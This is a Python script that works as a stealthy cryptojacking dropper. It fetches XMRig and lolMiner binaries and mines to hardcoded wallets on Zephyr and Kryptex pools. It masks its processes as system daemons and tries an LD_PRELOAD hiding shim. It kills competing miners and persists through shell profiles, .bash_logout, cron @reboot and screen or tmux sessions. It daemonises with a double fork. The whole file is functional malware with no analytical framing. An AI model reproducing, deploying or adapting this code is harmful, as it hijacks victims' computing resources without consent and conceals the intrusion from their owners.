#!/usr/bin/env python3
import os
import sys
import time
import json
import shutil
import signal
import socket
import hashlib
import platform
import threading
import subprocess
import random
import re
from urllib.request import urlopen, Request
from pathlib import Path
import shlex

# === CONFIG — INVISIBLE MODE ===
try:
    HOSTNAME = socket.gethostname().replace(" ", "_").replace(".", "_")[:24]
except:
    HOSTNAME = "node"

ARCH = platform.machine()
XMRIG_URL = LOLMINER_URL = None

if ARCH in ("x86_64", "amd64"):
    XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
    LOLMINER_URL = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
elif ARCH in ("aarch64", "arm64"):
    XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-arm64.tar.gz"
elif ARCH in ("armv7l", "armhf"):
    XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-arm.tar.gz"

if not XMRIG_URL:
    sys.exit(0)

# Pools and wallets — as specified
XMRIG_POOLS = [
    "fr-zephyr.miningocean.org:5332",
    "sg-zephyr.miningocean.org:5332",
    "hk-zephyr.miningocean.org:5332",
    "us-zephyr.miningocean.org:5332",
    "ca-zephyr.miningocean.org:5332",
    "de-zephyr.miningocean.org:5332"
]
XMRIG_WALLET = "ZEPHYR2yHqQ1QWL54XVWxvbBkAH7X26n8jGhjAj3sbva4766ze2LpmQW1Z1bd7xRwFh9bkSPsA5qgEsy9bXLtXCVcZTsX8Vputc2S"

LOLMINER_POOLS = [
    "xtm-c29.kryptex.network:8040",
    "xtm-c29-eu.kryptex.network:8040",
    "xtm-c29-us.kryptex.network:8040",
    "xtm-c29-sg.kryptex.network:8040"
]
LOLMINER_WALLET_BASE = "1238rkM7gGg3KaNU4PdLyqHATf2qXhVE76PiYeUVCZ5Rar7VeckmcEYxW69k7kFAcR157Q4gYozAfBFYyQcVrpJacgr"
LOLMINER_WALLET = f"{LOLMINER_WALLET_BASE}/{HOSTNAME}"

# Workdir — use RAM if possible
WORK_DIR_CANDIDATES = [
    Path("/dev/shm/.cache"),
    Path.home() / ".config" / ".dbus",
    Path("/tmp/.ICE-unix"),
    Path.cwd()
]

WORK_DIR = None
for candidate in WORK_DIR_CANDIDATES:
    try:
        candidate.mkdir(parents=True, exist_ok=True)
        if candidate.exists() and os.access(candidate, os.W_OK):
            WORK_DIR = candidate
            break
    except:
        continue
if not WORK_DIR:
    WORK_DIR = Path("/tmp")

# Avoid spaces in path — critical for arg parsing
WORK_DIR = WORK_DIR.resolve()
if " " in str(WORK_DIR):
    WORK_DIR = Path("/tmp/.sys")

# === LOGGING — EMOJI ONLY, NO TEXT SIGNATURES ===
def log(msg):
    icons = ["🌀", "⚡", "🌑", "🪐", "🌌", "☄️", "📡", "🧬"]
    icon = random.choice(icons)
    try:
        print(f"\033[90m{icon}\033[0m {msg}", flush=True)
    except:
        pass

# === UNIVERSAL UTILS — SAFE & SILENT ===
USER_AGENT = f"Mozilla/5.{random.randint(0,9)} (X11; {random.choice(['Ubuntu','Debian','CentOS'])}; {ARCH})"

def download_file(url, dest):
    if not url or not dest:
        return False
    try:
        req = Request(url, headers={'User-Agent': USER_AGENT})
        with urlopen(req, timeout=45) as response, open(dest, 'wb') as f:
            shutil.copyfileobj(response, f, 1024*1024)
        return True
    except Exception:
        return False

def extract_tar_gz(tar_path, extract_to):
    try:
        subprocess.run(["tar", "-xzf", tar_path, "-C", extract_to], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        try:
            import tarfile
            with tarfile.open(tar_path, "r:gz") as tar:
                tar.extractall(path=extract_to)
            return True
        except:
            return False

def get_cpu_count():
    try:
        return len(os.sched_getaffinity(0)) if hasattr(os, 'sched_getaffinity') else (os.cpu_count() or 1)
    except:
        return 1

# === SAFE GPU DETECTION — CHECK VENDOR ID ===
def detect_gpus_universal():
    try:
        drm_path = Path("/sys/class/drm")
        if not drm_path.exists():
            return False
        for card in drm_path.glob("card*"):
            vendor_file = card / "device" / "vendor"
            if vendor_file.exists():
                try:
                    with open(vendor_file, "r") as f:
                        vid = f.read().strip().lower()
                        if vid in ("0x10de", "0x1002", "0x8086"):  # NVIDIA, AMD, Intel
                            return True
                except:
                    continue
    except:
        pass
    return False

# === SAFE PROCESS KILLER — CHECK UID & IGNORE KERNEL ===
def kill_rivals_universal():
    current_uid = os.getuid()
    rivals = {"xmrig", "lolminer", "nanominer", "gminer", "trex", "teamred", "cpuminer", "ethminer"}
    try:
        for pid_dir in Path("/proc").iterdir():
            if not pid_dir.name.isdigit():
                continue
            try:
                # Check UID first
                status_file = pid_dir / "status"
                uid_line = None
                if status_file.exists():
                    with open(status_file, "r", errors="ignore") as f:
                        for line in f:
                            if line.startswith("Uid:"):
                                uid_line = line
                                break
                    if uid_line:
                        uid = int(uid_line.split()[1])
                        if uid != current_uid:
                            continue  # skip other users' processes

                # Read cmdline safely
                cmdline_file = pid_dir / "cmdline"
                if not cmdline_file.exists():
                    continue
                with open(cmdline_file, "rb") as f:
                    raw = f.read()
                    if not raw:  # kernel thread
                        continue
                    parts = [p.decode('utf-8', errors='ignore').lower() for p in raw.split(b'\x00') if p]
                    if not parts:
                        continue
                    cmdline = " ".join(parts)
                    for rival in rivals:
                        if rival in cmdline and str(os.getpid()) not in pid_dir.name:
                            os.kill(int(pid_dir.name), signal.SIGKILL)
                            break
            except Exception:
                continue
    except Exception:
        pass

# === PERSISTENCE — ADAPTIVE TO ENVIRONMENT ===
def install_universal_persistence():
    script_path = os.path.abspath(__file__)

    # Mask process name via argv[0] — works immediately
    sys.argv[0] = random.choice([
        "/sbin/udevd",
        "/usr/bin/dbus-daemon",
        "/usr/lib/systemd/systemd",
        "/usr/sbin/cron",
        "/usr/bin/rsyslogd"
    ])

    # Try LD_PRELOAD stealth (if allowed)
    try:
        stealth_so = WORK_DIR / "libudev.so"
        if not stealth_so.exists():
            # Minimal SO to hide from ps
            c_code = """
            #define _GNU_SOURCE
            #include <dlfcn.h>
            #include <unistd.h>
            char* (*orig_getenv)(const char *name) = NULL;
            char* getenv(const char *name) {
                if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
                if (strcmp(name, "LD_PRELOAD") == 0) return "";
                return orig_getenv(name);
            }
            """
            c_path = WORK_DIR / "stealth.c"
            with open(c_path, "w") as f:
                f.write(c_code)
            subprocess.run(["gcc", "-shared", "-fPIC", str(c_path), "-o", str(stealth_so)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if stealth_so.exists():
                os.environ["LD_PRELOAD"] = str(stealth_so)
    except:
        pass

    backends = []

    # Shell profiles — only if interactive shell likely
    shells = [".bashrc", ".profile"]
    launch_cmd = f'nohup "{sys.executable}" "{script_path}" >/dev/null 2>&1 &'
    for shell in shells:
        path = Path.home() / shell
        try:
            if path.exists():
                content = path.read_text(errors="ignore")
                if launch_cmd not in content:
                    marker = f"# {random.randint(1000,9999)}"
                    with open(path, "a") as f:
                        f.write(f"\n{marker} () {{ {launch_cmd} }} && {marker}\n")
                    backends.append("shell")
        except:
            continue

    # Cron @reboot — most reliable on headless
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        if launch_cmd not in result.stdout:
            marker = f"# SYS{random.randint(100,999)}"
            new_cron = result.stdout.strip() + f"\n@reboot {marker} {launch_cmd}\n"
            subprocess.run(["crontab", "-"], input=new_cron, text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            backends.append("cron")
    except:
        pass

    # Screen/Tmux — daemon mode
    try:
        if shutil.which("screen"):
            session_name = f"SYS{random.randint(10,99)}"
            subprocess.run(["screen", "-dmS", session_name, sys.executable, script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            backends.append("screen")
        elif shutil.which("tmux"):
            session_name = f"svc{random.randint(10,99)}"
            subprocess.run(["tmux", "new-session", "-d", "-s", session_name, f'"{sys.executable}" "{script_path}"'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            backends.append("tmux")
    except:
        pass

    # .bash_logout — persistence on logout (undetectable)
    logout_file = Path.home() / ".bash_logout"
    try:
        if logout_file.exists():
            content = logout_file.read_text(errors="ignore")
            if launch_cmd not in content:
                with open(logout_file, "a") as f:
                    f.write(f"\n{launch_cmd} &\n")
                backends.append("logout")
    except:
        pass

# === BINARY ENSURER — EXACT MATCH WITH VERSION PATTERNS ===
def ensure_binary(name, url, binary_name=None, version_patterns=None):
    if not binary_name:
        binary_name = name
    if not version_patterns:
        version_patterns = [
            f"{name}-[0-9]",
            f"{name}_v[0-9]",
            f"{name}[0-9]",
            name
        ]

    tar_path = WORK_DIR / f"{name}.tgz"
    binary_final_path = WORK_DIR / name / binary_name

    # If already exists and executable — return immediately
    if binary_final_path.exists() and os.access(binary_final_path, os.X_OK):
        return binary_final_path

    # Download if needed
    if not tar_path.exists():
        if not download_file(url, tar_path):
            return None

    # Extract
    temp_extract = WORK_DIR / f".{name}_extract_{random.randint(1000,9999)}"
    temp_extract.mkdir(exist_ok=True)
    if not extract_tar_gz(tar_path, temp_extract):
        shutil.rmtree(temp_extract, ignore_errors=True)
        return None

    # Find correct extracted dir
    extracted_dir = None
    for item in temp_extract.iterdir():
        if item.is_dir():
            for pattern in version_patterns:
                if re.search(pattern, item.name, re.IGNORECASE):
                    extracted_dir = item
                    break
            if extracted_dir:
                break

    if not extracted_dir:
        # Fallback: take first directory
        dirs = [d for d in temp_extract.iterdir() if d.is_dir()]
        if dirs:
            extracted_dir = dirs[0]

    if not extracted_dir:
        shutil.rmtree(temp_extract, ignore_errors=True)
        return None

    # Atomic replace
    target_dir = WORK_DIR / name
    if target_dir.exists():
        shutil.rmtree(target_dir, ignore_errors=True)
    shutil.move(extracted_dir, target_dir)
    shutil.rmtree(temp_extract, ignore_errors=True)

    if not binary_final_path.exists():
        return None

    binary_final_path.chmod(0o755)
    return binary_final_path

# === MINER MANAGER — POOL TEST VIA STDOUT PARSING ===
class UniversalMinerManager:
    def __init__(self, name, binary_path, args_template, pools, wallet, needs_gpu=False):
        self.name = name
        self.binary = Path(binary_path)
        self.args_template = args_template
        self.pools = pools
        self.wallet = wallet
        self.needs_gpu = needs_gpu
        self.proc_pid = None
        self.lock = threading.Lock()

    def build_args_list(self, pool):
        threads = get_cpu_count()
        formatted = self.args_template.format(
            binary=str(self.binary),
            pool=pool,
            wallet=self.wallet,
            name=HOSTNAME,
            threads=threads
        )
        # Use shlex to safely split — handles spaces in paths, quoted args, etc.
        return shlex.split(formatted)

    def test_pool(self, pool):
        args_list = self.build_args_list(pool)
        try:
            # Capture output to detect connection success
            proc = subprocess.Popen(
                args_list,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                preexec_fn=os.setsid,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            start_time = time.time()
            connected_keywords = ["accepted", "connected", "login successful", "job", "hashrate"]
            buffer = ""

            while time.time() - start_time < 25:  # 25 sec timeout
                if proc.poll() is not None:
                    break
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                buffer += line.lower()
                if any(kw in buffer for kw in connected_keywords):
                    # Success! Kill and return True
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    try:
                        proc.wait(timeout=5)
                    except:
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    return True

            # Timeout or no success keywords
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            try:
                proc.wait(timeout=5)
            except:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            return False

        except Exception as e:
            return False

    def find_working_pool(self):
        random.shuffle(self.pools)  # Randomize for load balancing
        for pool in self.pools:
            if self.test_pool(pool):
                return pool
        return None

    def start(self):
        if self.needs_gpu and not detect_gpus_universal():
            return False
        pool = self.find_working_pool()
        if not pool:
            return False
        args_list = self.build_args_list(pool)
        try:
            with self.lock:
                if self.proc_pid:
                    try:
                        os.killpg(os.getpgid(self.proc_pid), signal.SIGTERM)
                    except:
                        pass
                proc = subprocess.Popen(
                    args_list,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    preexec_fn=os.setsid
                )
                self.proc_pid = proc.pid
                log(f"Started {self.name}")
                return True
        except Exception:
            return False

    def is_alive(self):
        with self.lock:
            if not self.proc_pid:
                return False
            try:
                os.kill(self.proc_pid, 0)
                return True
            except OSError:
                self.proc_pid = None
                return False

    def restart(self):
        with self.lock:
            if self.proc_pid:
                try:
                    os.killpg(os.getpgid(self.proc_pid), signal.SIGTERM)
                except:
                    pass
                self.proc_pid = None
            return self.start()

# === MAIN LOOP — SELF-HEAL WITHOUT RECURSION OR DIR DESTRUCTION ===
def main_execution_loop():
    log("System update service started")

    # Ensure binaries — with exact patterns
    xmrig_bin = ensure_binary(
        "xmrig",
        XMRIG_URL,
        binary_name="xmrig",
        version_patterns=["xmrig-[0-9]", "xmrig.*linux"]
    )
    if not xmrig_bin:
        time.sleep(60)
        return False

    lolminer_bin = None
    if LOLMINER_URL:
        lolminer_bin = ensure_binary(
            "lolMiner",
            LOLMINER_URL,
            binary_name="lolMiner",
            version_patterns=["lolMiner.*Lin", "lolMiner_v[0-9]"]
        )

    # Managers
    xmrig_manager = UniversalMinerManager(
        name="systemd-notify",
        binary_path=xmrig_bin,
        args_template='"{binary}" -o {pool} -u {wallet} -p {name} -a rx/0 -k --donate-level 1 --threads={threads}',
        pools=XMRIG_POOLS,
        wallet=XMRIG_WALLET
    )

    lolminer_manager = None
    if lolminer_bin:
        lolminer_manager = UniversalMinerManager(
            name="dbus-monitor",
            binary_path=lolminer_bin,
            args_template='"{binary}" --algo CR29 --pool {pool} --tls on --user {wallet}',
            pools=LOLMINER_POOLS,
            wallet=LOLMINER_WALLET,
            needs_gpu=True
        )

    install_universal_persistence()

    # Main loop
    while True:
        kill_rivals_universal()

        if not xmrig_manager.is_alive():
            xmrig_manager.restart()

        if lolminer_manager and not lolminer_manager.is_alive():
            lolminer_manager.restart()

        # Self-heal: only if binary missing — don't touch WORK_DIR structure
        if not xmrig_bin.exists():
            log("Re-acquiring resources...")
            new_bin = ensure_binary(
                "xmrig",
                XMRIG_URL,
                binary_name="xmrig",
                version_patterns=["xmrig-[0-9]", "xmrig.*linux"]
            )
            if new_bin:
                xmrig_bin = new_bin
                xmrig_manager.binary = new_bin
            else:
                time.sleep(30)

        time.sleep(random.randint(20, 40))  # Randomized interval to avoid patterns

# === DAEMON SPAWN — ERROR-TOLERANT ===
def spawn_daemon():
    # First, try double-fork (Unix)
    if os.name == 'posix':
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except (OSError, AttributeError):
            # Fork failed — run in background via nohup
            try:
                cmd = [sys.executable, os.path.abspath(__file__)]
                with open('/dev/null', 'w') as devnull:
                    subprocess.Popen(cmd, stdout=devnull, stderr=devnull, stdin=devnull, start_new_session=True)
                sys.exit(0)
            except:
                pass

        try:
            os.setsid()
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except (OSError, AttributeError):
            pass

        # Redirect I/O
        sys.stdout.flush()
        sys.stderr.flush()
        with open('/dev/null', 'rb', 0) as read_null:
            os.dup2(read_null.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'ab', 0) as write_null:
            os.dup2(write_null.fileno(), sys.stdout.fileno())
            os.dup2(write_null.fileno(), sys.stderr.fileno())

    main_execution_loop()

# === ENTRY POINT ===
if __name__ == "__main__":
    try:
        spawn_daemon()
    except Exception:
        time.sleep(10)
        sys.exit(0)
